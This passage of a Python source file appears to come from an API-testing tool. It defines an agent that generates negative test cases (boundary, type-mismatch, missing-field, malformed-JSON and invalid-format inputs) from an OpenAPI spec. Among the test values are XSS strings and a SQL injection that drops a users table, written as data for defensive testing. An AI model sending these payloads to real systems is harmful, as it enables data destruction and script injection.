"""
Functional-Negative-Agent: Generates tests to trigger errors and validate failure paths.

This agent focuses on creating test cases that should fail under various conditions,
validating that the API properly handles invalid inputs and edge cases using a hybrid
approach of deterministic Boundary Value Analysis and LLM-powered creative generation.
"""

from typing import Dict, List, Any, Optional, Union, Set, Tuple
import random
import string
from datetime import datetime, timedelta
import json
import re
import uuid
import decimal
from urllib.parse import urlparse
from copy import deepcopy

from .base_agent import BaseAgent, AgentTask, AgentResult
from sentinel_backend.config.settings import get_application_settings


class FunctionalNegativeAgent(BaseAgent):
    """
    Agent responsible for generating negative functional test cases.
    
    This agent creates test cases that:
    - Use invalid data to trigger error responses
    - Test boundary conditions and edge cases
    - Validate proper error handling (4xx, 5xx responses)
    - Use both deterministic BVA and creative LLM-inspired techniques
    """
    
    def __init__(self):
        super().__init__("Functional-Negative-Agent")
    
    async def execute(self, task: AgentTask, api_spec: Dict[str, Any]) -> AgentResult:
        """
        Generate negative functional test cases for the given API specification.
        
        Args:
            task: The agent task containing parameters and context
            api_spec: The parsed OpenAPI specification
            
        Returns:
            AgentResult with generated negative test cases
        """
        try:
            self.logger.info(f"Starting negative test generation for spec_id: {task.spec_id}")
            
            # Extract all endpoints from the specification
            endpoints = self._extract_endpoints(api_spec)
            
            test_cases = []
            
            # Generate test cases for each endpoint
            for endpoint in endpoints:
                endpoint_tests = await self._generate_endpoint_negative_tests(endpoint, api_spec)
                test_cases.extend(endpoint_tests)
            
            # If LLM is enabled, generate additional creative negative tests
            if self.llm_enabled and test_cases:
                self.logger.info("Generating LLM-enhanced negative test cases")
                llm_tests = await self._generate_llm_negative_tests(endpoints[:3], api_spec)  # Limit to 3 endpoints for cost
                test_cases.extend(llm_tests)
            
            self.logger.info(f"Generated {len(test_cases)} negative test cases")
            
            return AgentResult(
                task_id=task.task_id,
                agent_type=self.agent_type,
                status="success",
                test_cases=test_cases,
                metadata={
                    "total_endpoints": len(endpoints),
                    "total_test_cases": len(test_cases),
                    "generation_strategy": "hybrid_bva_and_creative",
                    "test_categories": [
                        "boundary_value_analysis",
                        "invalid_data_types",
                        "missing_required_fields",
                        "malformed_requests",
                        "constraint_violations"
                    ],
                    "llm_enhanced": self.llm_enabled,
                    "llm_provider": getattr(self.llm_provider.config, 'provider', 'none') if self.llm_provider else 'none',
                    "llm_model": getattr(self.llm_provider.config, 'model', 'none') if self.llm_provider else 'none'
                }
            )
            
        except Exception as e:
            self.logger.error(f"Error generating negative test cases: {str(e)}")
            return AgentResult(
                task_id=task.task_id,
                agent_type=self.agent_type,
                status="failed",
                error_message=str(e)
            )
    
    async def _generate_endpoint_negative_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Generate comprehensive negative test cases for a specific endpoint.

        Args:
            endpoint: The endpoint definition from the API spec
            api_spec: The full API specification for context

        Returns:
            List of negative test cases for this endpoint
        """
        test_cases = []

        # Stage 1: Format-Specific Invalid Value Tests
        format_tests = await self._generate_format_specific_tests(endpoint, api_spec)
        test_cases.extend(format_tests)

        # Stage 2: Comprehensive Boundary Value Analysis
        bva_tests = await self._generate_comprehensive_bva_tests(endpoint, api_spec)
        test_cases.extend(bva_tests)

        # Stage 3: Type Mismatch Variations
        type_mismatch_tests = await self._generate_type_mismatch_tests(endpoint, api_spec)
        test_cases.extend(type_mismatch_tests)

        # Stage 4: Required Field Systematic Tests
        required_field_tests = await self._generate_required_field_tests(endpoint, api_spec)
        test_cases.extend(required_field_tests)

        # Stage 5: Schema Constraint Violation Tests
        constraint_tests = await self._generate_constraint_violation_tests(endpoint, api_spec)
        test_cases.extend(constraint_tests)

        # Stage 6: Null/Undefined Testing
        null_tests = await self._generate_null_undefined_tests(endpoint, api_spec)
        test_cases.extend(null_tests)

        # Stage 7: Array Constraint Testing
        array_tests = await self._generate_array_constraint_tests(endpoint, api_spec)
        test_cases.extend(array_tests)

        # Stage 8: Enum Invalid Value Tests
        enum_tests = await self._generate_enum_invalid_tests(endpoint, api_spec)
        test_cases.extend(enum_tests)

        # Stage 9: Nested Object Testing
        nested_tests = await self._generate_nested_object_tests(endpoint, api_spec)
        test_cases.extend(nested_tests)

        # Stage 10: Multiple Validation Failure Tests
        multiple_failure_tests = await self._generate_multiple_validation_tests(endpoint, api_spec)
        test_cases.extend(multiple_failure_tests)

        # Stage 11: Content-Type Testing
        content_type_tests = await self._generate_content_type_tests(endpoint, api_spec)
        test_cases.extend(content_type_tests)

        # Stage 12: Special Character & Injection Tests
        injection_tests = await self._generate_injection_tests(endpoint, api_spec)
        test_cases.extend(injection_tests)

        # Stage 13: Partial Update Testing (for PATCH)
        if endpoint["method"] == "PATCH":
            patch_tests = await self._generate_patch_specific_tests(endpoint, api_spec)
            test_cases.extend(patch_tests)

        # Stage 14: Collection Endpoint Tests
        if self._is_collection_endpoint(endpoint):
            collection_tests = await self._generate_collection_endpoint_tests(endpoint, api_spec)
            test_cases.extend(collection_tests)

        # Stage 15: Structural Malformation Tests (enhanced)
        structural_tests = await self._generate_enhanced_structural_tests(endpoint, api_spec)
        test_cases.extend(structural_tests)

        return test_cases
    
    async def _generate_bva_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Generate boundary value analysis tests using deterministic algorithms.
        
        This systematically tests the boundaries of defined constraints.
        """
        test_cases = []
        parameters = endpoint["parameters"]
        
        # Test parameter boundary violations
        for param in parameters:
            param_bva_tests = self._generate_parameter_bva_tests(param, endpoint, api_spec)
            test_cases.extend(param_bva_tests)
        
        # Test request body boundary violations
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_bva_tests = await self._generate_body_bva_tests(endpoint, api_spec)
            test_cases.extend(body_bva_tests)
        
        return test_cases
    
    def _generate_parameter_bva_tests(
        self, 
        param: Dict[str, Any], 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate BVA tests for a specific parameter."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]
        param_in = param.get("in", "query")
        
        # Test numeric boundaries
        if schema.get("type") in ["integer", "number"]:
            numeric_tests = self._generate_numeric_boundary_tests(param, endpoint, api_spec)
            test_cases.extend(numeric_tests)
        
        # Test string length boundaries
        elif schema.get("type") == "string":
            string_tests = self._generate_string_boundary_tests(param, endpoint, api_spec)
            test_cases.extend(string_tests)
        
        # Test array size boundaries
        elif schema.get("type") == "array":
            array_tests = self._generate_array_boundary_tests(param, endpoint, api_spec)
            test_cases.extend(array_tests)
        
        # Test enum violations
        if "enum" in schema:
            enum_tests = self._generate_enum_violation_tests(param, endpoint, api_spec)
            test_cases.extend(enum_tests)
        
        return test_cases
    
    def _generate_numeric_boundary_tests(
        self, 
        param: Dict[str, Any], 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate boundary tests for numeric parameters."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]
        param_in = param.get("in", "query")
        
        # Test minimum boundary violations
        if "minimum" in schema:
            minimum = schema["minimum"]
            exclusive = schema.get("exclusiveMinimum", False)
            
            if exclusive:
                invalid_value = minimum
                description = f"Test {param_name} with exclusive minimum boundary violation (value = {invalid_value})"
            else:
                invalid_value = minimum - 1
                description = f"Test {param_name} below minimum boundary (value = {invalid_value})"
            
            test_case = self._create_parameter_test_case(
                endpoint, param, invalid_value, description, 400
            )
            test_cases.append(test_case)
        
        # Test maximum boundary violations
        if "maximum" in schema:
            maximum = schema["maximum"]
            exclusive = schema.get("exclusiveMaximum", False)
            
            if exclusive:
                invalid_value = maximum
                description = f"Test {param_name} with exclusive maximum boundary violation (value = {invalid_value})"
            else:
                invalid_value = maximum + 1
                description = f"Test {param_name} above maximum boundary (value = {invalid_value})"
            
            test_case = self._create_parameter_test_case(
                endpoint, param, invalid_value, description, 400
            )
            test_cases.append(test_case)
        
        return test_cases
    
    def _generate_string_boundary_tests(
        self, 
        param: Dict[str, Any], 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate boundary tests for string parameters."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]
        
        # Test minLength violations
        if "minLength" in schema:
            min_length = schema["minLength"]
            if min_length > 0:
                invalid_value = "x" * (min_length - 1)
                description = f"Test {param_name} below minimum length (length = {len(invalid_value)})"
                
                test_case = self._create_parameter_test_case(
                    endpoint, param, invalid_value, description, 400
                )
                test_cases.append(test_case)
        
        # Test maxLength violations
        if "maxLength" in schema:
            max_length = schema["maxLength"]
            invalid_value = "x" * (max_length + 1)
            description = f"Test {param_name} above maximum length (length = {len(invalid_value)})"
            
            test_case = self._create_parameter_test_case(
                endpoint, param, invalid_value, description, 400
            )
            test_cases.append(test_case)
        
        # Test pattern violations
        if "pattern" in schema:
            pattern = schema["pattern"]
            # Generate a string that definitely doesn't match the pattern
            invalid_value = "INVALID_PATTERN_123!@#"
            description = f"Test {param_name} with pattern violation"
            
            test_case = self._create_parameter_test_case(
                endpoint, param, invalid_value, description, 400
            )
            test_cases.append(test_case)
        
        return test_cases
    
    def _generate_array_boundary_tests(
        self, 
        param: Dict[str, Any], 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate boundary tests for array parameters."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]
        
        # Test minItems violations
        if "minItems" in schema:
            min_items = schema["minItems"]
            if min_items > 0:
                invalid_value = ["item"] * (min_items - 1)
                description = f"Test {param_name} below minimum items (count = {len(invalid_value)})"
                
                test_case = self._create_parameter_test_case(
                    endpoint, param, invalid_value, description, 400
                )
                test_cases.append(test_case)
        
        # Test maxItems violations
        if "maxItems" in schema:
            max_items = schema["maxItems"]
            invalid_value = ["item"] * (max_items + 1)
            description = f"Test {param_name} above maximum items (count = {len(invalid_value)})"
            
            test_case = self._create_parameter_test_case(
                endpoint, param, invalid_value, description, 400
            )
            test_cases.append(test_case)
        
        return test_cases
    
    def _generate_enum_violation_tests(
        self, 
        param: Dict[str, Any], 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests that violate enum constraints."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]
        enum_values = schema.get("enum", [])
        
        if enum_values:
            # Generate a value that's definitely not in the enum
            invalid_value = "INVALID_ENUM_VALUE_XYZ"
            description = f"Test {param_name} with invalid enum value"
            
            test_case = self._create_parameter_test_case(
                endpoint, param, invalid_value, description, 400
            )
            test_cases.append(test_case)
        
        return test_cases
    
    async def _generate_body_bva_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate BVA tests for request body constraints."""
        test_cases = []
        request_body = endpoint["requestBody"]
        
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        if not json_content:
            return test_cases
        
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)
        
        # Generate tests for object property constraints
        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})
            
            for prop_name, prop_schema in properties.items():
                prop_tests = self._generate_property_bva_tests(
                    prop_name, prop_schema, endpoint, api_spec
                )
                test_cases.extend(prop_tests)
        
        return test_cases
    
    def _generate_property_bva_tests(
        self, 
        prop_name: str, 
        prop_schema: Dict[str, Any], 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate BVA tests for a specific object property."""
        test_cases = []
        
        # Create a base valid body
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases
        
        # Test numeric property boundaries
        if prop_schema.get("type") in ["integer", "number"]:
            if "minimum" in prop_schema:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = prop_schema["minimum"] - 1
                
                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} below minimum in request body",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)
            
            if "maximum" in prop_schema:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = prop_schema["maximum"] + 1
                
                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} above maximum in request body",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)
        
        # Test string property boundaries
        elif prop_schema.get("type") == "string":
            if "minLength" in prop_schema and prop_schema["minLength"] > 0:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = "x" * (prop_schema["minLength"] - 1)
                
                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} below minimum length in request body",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)
            
            if "maxLength" in prop_schema:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = "x" * (prop_schema["maxLength"] + 1)
                
                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} above maximum length in request body",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)
        
        return test_cases
    
    async def _generate_creative_invalid_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Generate creative invalid test cases using LLM-inspired techniques.
        
        This simulates what an LLM might generate for creative invalid inputs.
        """
        test_cases = []
        
        # Generate wrong data type tests
        type_tests = self._generate_wrong_type_tests(endpoint, api_spec)
        test_cases.extend(type_tests)
        
        # Generate missing required field tests
        missing_tests = self._generate_missing_required_tests(endpoint, api_spec)
        test_cases.extend(missing_tests)
        
        # Generate unexpected extra field tests
        extra_field_tests = self._generate_extra_field_tests(endpoint, api_spec)
        test_cases.extend(extra_field_tests)
        
        # Generate semantic violation tests
        semantic_tests = self._generate_semantic_violation_tests(endpoint, api_spec)
        test_cases.extend(semantic_tests)
        
        return test_cases
    
    def _generate_wrong_type_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with wrong data types."""
        test_cases = []
        
        # Test wrong types in parameters
        for param in endpoint["parameters"]:
            schema = param.get("schema", {})
            expected_type = schema.get("type", "string")
            
            wrong_value = self._get_wrong_type_value(expected_type)
            if wrong_value is not None:
                test_case = self._create_parameter_test_case(
                    endpoint, param, wrong_value, 
                    f"Test {param['name']} with wrong data type", 400
                )
                test_cases.append(test_case)
        
        # Test wrong types in request body
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_type_tests = self._generate_body_wrong_type_tests(endpoint, api_spec)
            test_cases.extend(body_type_tests)
        
        return test_cases
    
    # === FORMAT-SPECIFIC INVALID VALUE GENERATORS ===

    def _generate_invalid_email(self) -> List[str]:
        """Generate various invalid email formats."""
        return [
            "invalid-email",
            "@example.com",
            "user@",
            "user@.com",
            "user.@example.com",
            "user..user@example.com",
            "user@example.",
            "user@.example.com",
            "user name@example.com",  # space
            "user@exam ple.com",      # space in domain
            "user@example..com",      # double dot
            "user@",                  # no domain
            "@",                      # just @
            "",                       # empty
            "user@-example.com",      # domain starts with dash
            "user@example-.com",      # domain ends with dash
            "a" * 320 + "@example.com",  # too long
            "user@" + "a" * 255 + ".com",  # domain too long
        ]

    def _generate_invalid_url(self) -> List[str]:
        """Generate various invalid URL formats."""
        return [
            "not-a-url",
            "http://",
            "://example.com",
            "http:/example.com",     # missing slash
            "http:///example.com",   # extra slash
            "http://exam ple.com",   # space
            "http://example",        # no TLD
            "http://.com",           # no domain
            "http://example.",       # no TLD
            "ftp://" + "a" * 2100,   # too long
            "http://[invalid",       # invalid IPv6
            "http://256.256.256.256", # invalid IPv4
            "javascript:alert(1)",   # XSS attempt
            "data:text/html,<script>alert(1)</script>",  # data URL XSS
        ]

    def _generate_invalid_uuid(self) -> List[str]:
        """Generate various invalid UUID formats."""
        return [
            "not-a-uuid",
            "123e4567-e89b-12d3-a456-42661417400",   # too short
            "123e4567-e89b-12d3-a456-4266141740000", # too long
            "123e4567-e89b-12d3-a456-42661417400g",  # invalid char
            "123e4567e89b12d3a45642661417400",        # no dashes
            "123e4567-e89b-12d3-a456",                # incomplete
            "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",  # all x
            "",                                       # empty
            "00000000-0000-0000-0000-000000000000",  # all zeros
            "123E4567-E89B-12D3-A456-426614174000",  # uppercase
        ]

    def _generate_invalid_date(self) -> List[str]:
        """Generate various invalid date formats."""
        return [
            "not-a-date",
            "2023-13-01",       # invalid month
            "2023-02-30",       # invalid day for February
            "2023-04-31",       # invalid day for April
            "2023-00-01",       # zero month
            "2023-01-00",       # zero day
            "2023-1-1",         # single digit month/day
            "23-01-01",         # two digit year
            "2023/01/01",       # wrong separator
            "01-01-2023",       # wrong order
            "2023-01-01T25:00:00Z",  # invalid hour
            "2023-01-01T12:60:00Z",  # invalid minute
            "2023-01-01T12:00:60Z",  # invalid second
            "2023-01-01 12:00:00",   # space instead of T
            "2023-01-01T12:00:00",   # missing timezone
            "",                      # empty
            "9999-12-31T23:59:59Z",  # future date
            "0000-01-01T00:00:00Z",  # year zero
        ]

    def _generate_invalid_phone(self) -> List[str]:
        """Generate various invalid phone number formats."""
        return [
            "not-a-phone",
            "123",               # too short
            "1" * 20,           # too long
            "+1-555-abc-defg",  # letters
            "555 555 555",      # spaces only
            "(555) 555-555",    # incomplete
            "+1-555-555-55555", # too many digits in last part
            "++1-555-555-5555", # double plus
            "1-555-555-5555-",  # trailing dash
            "-555-555-5555",    # leading dash
            "555.555.555.555",  # too many parts
            "",                  # empty
            "   ",               # spaces only
            "000-000-0000",     # all zeros
        ]

    def _generate_invalid_ip_address(self) -> List[str]:
        """Generate various invalid IP address formats."""
        return [
            "not-an-ip",
            "256.1.1.1",        # octet > 255
            "1.1.1",            # incomplete
            "1.1.1.1.1",        # too many octets
            "1.1.1.-1",         # negative
            "1.1.1.a",          # letter
            "1.1.1.1/24",       # CIDR notation
            "001.001.001.001",  # leading zeros
            "",                  # empty
            "...",               # dots only
            "192.168.1",        # incomplete private
            "999.999.999.999",  # all invalid octets
        ]

    def _generate_invalid_credit_card(self) -> List[str]:
        """Generate various invalid credit card numbers."""
        return [
            "not-a-card",
            "1234567890123456",  # invalid checksum
            "123456789012345",   # too short
            "12345678901234567", # too long
            "4111-1111-1111-111a", # letter
            "4111 1111 1111 111",  # too short with spaces
            "0000000000000000",   # all zeros
            "1111111111111111",   # all ones
            "",                    # empty
            "   ",                 # spaces only
            "4111-1111-1111",     # incomplete
            "4111111111111111111", # way too long
        ]

    # === COMPREHENSIVE TYPE MISMATCH GENERATORS ===

    def _get_all_wrong_type_values(self, expected_type: str) -> List[Any]:
        """Get comprehensive list of wrong type values for testing."""
        type_variations = {
            "string": [
                12345,           # integer
                45.67,           # float
                True,            # boolean
                ["array"],       # array
                {"object": True}, # object
                None,            # null
            ],
            "integer": [
                "not_a_number",  # string
                45.67,           # float (sometimes invalid for strict integer)
                True,            # boolean
                [123],           # array
                {"num": 123},    # object
                None,            # null
                "123",           # string number
                float('inf'),    # infinity
                float('nan'),    # NaN
            ],
            "number": [
                "not_a_number",  # string
                True,            # boolean
                [45.67],         # array
                {"num": 45.67},  # object
                None,            # null
                "45.67",         # string number
                "infinity",      # string infinity
                "NaN",           # string NaN
            ],
            "boolean": [
                "true",          # string
                1,               # integer
                0,               # integer
                [True],          # array
                {"bool": True},  # object
                None,            # null
                "false",         # string
                "yes",           # string
                "no",            # string
            ],
            "array": [
                "not_an_array",  # string
                123,             # integer
                45.67,           # float
                True,            # boolean
                {"not": "array"}, # object
                None,            # null
                "[1,2,3]",       # string representation
            ],
            "object": [
                "not_an_object", # string
                123,             # integer
                45.67,           # float
                True,            # boolean
                ["not", "object"], # array
                None,            # null
                "{}",            # string representation
                "null",          # string null
            ]
        }
        return type_variations.get(expected_type, ["invalid_value"])

    def _get_wrong_type_value(self, expected_type: str) -> Any:
        """Get a single wrong type value for testing."""
        wrong_values = self._get_all_wrong_type_values(expected_type)
        return wrong_values[0] if wrong_values else "invalid_value"

    def _get_schema_example(self, schema: Dict[str, Any]) -> Any:
        """Generate an example value based on schema type."""
        if "example" in schema:
            return schema["example"]

        schema_type = schema.get("type", "string")

        if schema_type == "string":
            if "enum" in schema:
                return schema["enum"][0]
            elif schema.get("format") == "email":
                return "test@example.com"
            elif schema.get("format") == "date":
                return "2023-01-01"
            elif schema.get("format") == "date-time":
                return "2023-01-01T00:00:00Z"
            elif schema.get("format") == "uuid":
                return "123e4567-e89b-12d3-a456-426614174000"
            elif schema.get("format") == "uri":
                return "https://example.com"
            else:
                min_length = schema.get("minLength", 0)
                max_length = schema.get("maxLength", 20)
                length = max(min_length, min(max_length, 10))
                return "test_string_" + "x" * max(0, length - 12)

        elif schema_type == "integer":
            minimum = schema.get("minimum", 0)
            maximum = schema.get("maximum", 100)
            return max(minimum, min(maximum, 42))

        elif schema_type == "number":
            minimum = schema.get("minimum", 0.0)
            maximum = schema.get("maximum", 100.0)
            return max(minimum, min(maximum, 42.5))

        elif schema_type == "boolean":
            return True

        elif schema_type == "array":
            items_schema = schema.get("items", {"type": "string"})
            min_items = schema.get("minItems", 1)
            max_items = schema.get("maxItems", 3)
            item_count = max(min_items, min(max_items, 2))
            return [self._get_schema_example(items_schema) for _ in range(item_count)]

        elif schema_type == "object":
            properties = schema.get("properties", {})
            required = schema.get("required", [])
            obj = {}

            # Include all required properties
            for prop_name in required:
                if prop_name in properties:
                    obj[prop_name] = self._get_schema_example(properties[prop_name])

            # Include some optional properties
            for prop_name, prop_schema in properties.items():
                if prop_name not in obj and random.random() < 0.7:
                    obj[prop_name] = self._get_schema_example(prop_schema)

            return obj

        else:
            return f"example_{schema_type}"
    
    def _generate_body_wrong_type_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate wrong type tests for request body properties."""
        test_cases = []
        
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases
        
        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)
        
        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})
            
            for prop_name, prop_schema in properties.items():
                expected_type = prop_schema.get("type", "string")
                wrong_value = self._get_wrong_type_value(expected_type)
                
                if wrong_value is not None:
                    invalid_body = base_body.copy()
                    invalid_body[prop_name] = wrong_value
                    
                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test {prop_name} with wrong data type in request body",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)
        
        return test_cases
    
    def _generate_missing_required_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with missing required fields."""
        test_cases = []
        
        # Test missing required parameters
        required_params = [p for p in endpoint["parameters"] if p.get("required", False)]
        for param in required_params:
            test_case = self._create_missing_parameter_test(endpoint, param)
            test_cases.append(test_case)
        
        # Test missing required body fields
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_missing_tests = self._generate_missing_body_field_tests(endpoint, api_spec)
            test_cases.extend(body_missing_tests)
        
        return test_cases
    
    def _create_missing_parameter_test(
        self, 
        endpoint: Dict[str, Any], 
        missing_param: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Create a test case with a missing required parameter."""
        # Build parameters excluding the missing one
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        query_params = {}
        path_params = {}
        
        for param in endpoint["parameters"]:
            if param["name"] != missing_param["name"]:
                if param.get("in") == "query":
                    query_params[param["name"]] = self._generate_valid_param_value(param)
                elif param.get("in") == "path":
                    path_params[param["name"]] = self._generate_valid_param_value(param)
                elif param.get("in") == "header":
                    headers[param["name"]] = self._generate_valid_param_value(param)
        
        # Build the endpoint path
        actual_path = endpoint["path"]
        for param_name, param_value in path_params.items():
            actual_path = actual_path.replace(f"{{{param_name}}}", str(param_value))
        
        return self._create_test_case(
            endpoint=actual_path,
            method=endpoint["method"],
            description=f"Test missing required parameter: {missing_param['name']}",
            headers=headers,
            query_params=query_params,
            expected_status=400
        )
    
    def _generate_missing_body_field_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with missing required body fields."""
        test_cases = []
        
        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)
        
        if resolved_schema.get("type") == "object":
            required_fields = resolved_schema.get("required", [])
            
            for required_field in required_fields:
                base_body = self._generate_base_valid_body(endpoint, api_spec)
                if base_body and required_field in base_body:
                    # Remove the required field
                    invalid_body = base_body.copy()
                    del invalid_body[required_field]
                    
                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test missing required field: {required_field}",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)
        
        return test_cases
    
    def _generate_extra_field_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with unexpected extra fields."""
        test_cases = []
        
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            base_body = self._generate_base_valid_body(endpoint, api_spec)
            if base_body:
                # Add unexpected fields
                invalid_body = base_body.copy()
                invalid_body.update({
                    "unexpected_field_1": "unexpected_value",
                    "malicious_script": "<script>alert('xss')</script>",
                    "sql_injection": "'; DROP TABLE users; --"
                })
                
                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description="Test with unexpected extra fields in request body",
                    body=invalid_body,
                    expected_status=400  # or 422, depending on API design
                )
                test_cases.append(test_case)
        
        return test_cases
    
    def _generate_semantic_violation_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests that violate semantic expectations."""
        test_cases = []
        
        # Generate tests based on common semantic violations
        semantic_violations = [
            {
                "description": "Test with negative ID where positive expected",
                "modifications": {"id": -1, "user_id": -999, "product_id": -123}
            },
            {
                "description": "Test with future date where past date expected",
                "modifications": {"birth_date": "2050-01-01", "created_at": "2099-12-31"}
            },
            {
                "description": "Test with invalid email format",
                "modifications": {"email": "not-an-email", "contact_email": "invalid@"}
            },
            {
                "description": "Test with empty string where meaningful content expected",
                "modifications": {"name": "", "title": "", "description": ""}
            },
            {
                "description": "Test with extremely long strings",
                "modifications": {
                    "name": "x" * 1000,
                    "description": "y" * 5000,
                    "title": "z" * 500
                }
            }
        ]
        
        for violation in semantic_violations:
            if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
                base_body = self._generate_base_valid_body(endpoint, api_spec)
                if base_body:
                    invalid_body = base_body.copy()
                    
                    # Apply modifications that exist in the body
                    for field, value in violation["modifications"].items():
                        if field in invalid_body:
                            invalid_body[field] = value
                            break  # Apply only one modification per test
                    
                    if invalid_body != base_body:  # Only create test if modification was applied
                        test_case = self._create_test_case(
                            endpoint=self._build_endpoint_path(endpoint),
                            method=endpoint["method"],
                            description=violation["description"],
                            body=invalid_body,
                            expected_status=400
                        )
                        test_cases.append(test_case)
        
        return test_cases
    
    async def _generate_structural_malformation_tests(
        self, 
        endpoint: Dict[str, Any], 
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with structurally malformed requests."""
        test_cases = []
        
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            malformed_tests = [
                {
                    "description": "Test with malformed JSON (missing quotes)",
                    "body": "{name: test, email: test@example.com}",  # Invalid JSON
                    "content_type": "application/json"
                },
                {
                    "description": "Test with malformed JSON (trailing comma)",
                    "body": '{"name": "test", "email": "test@example.com",}',  # Invalid JSON
                    "content_type": "application/json"
                },
                {
                    "description": "Test with empty request body",
                    "body": "",
                    "content_type": "application/json"
                },
                {
                    "description": "Test with null request body",
                    "body": None,
                    "content_type": "application/json"
                },
                {
                    "description": "Test with wrong content type",
                    "body": {"name": "test"},
                    "content_type": "text/plain"
                }
            ]
            
            for malformed_test in malformed_tests:
                headers = {
                    "Content-Type": malformed_test["content_type"],
                    "Accept": "application/json"
                }
                
                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=malformed_test["description"],
                    headers=headers,
                    body=malformed_test["body"],
                    expected_status=400
                )
                test_cases.append(test_case)
        
        return test_cases

    # === MISSING CRITICAL METHOD IMPLEMENTATIONS ===

    async def _generate_format_specific_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests for format-specific invalid values (emails, URLs, dates, etc.)."""
        test_cases = []

        # Test parameters with format constraints
        for param in endpoint["parameters"]:
            schema = param.get("schema", {})
            param_format = schema.get("format")

            if param_format:
                invalid_values = self._get_format_specific_invalid_values(param_format)
                for invalid_value in invalid_values:
                    test_case = self._create_parameter_test_case(
                        endpoint, param, invalid_value,
                        f"Test {param['name']} with invalid {param_format} format: {invalid_value}",
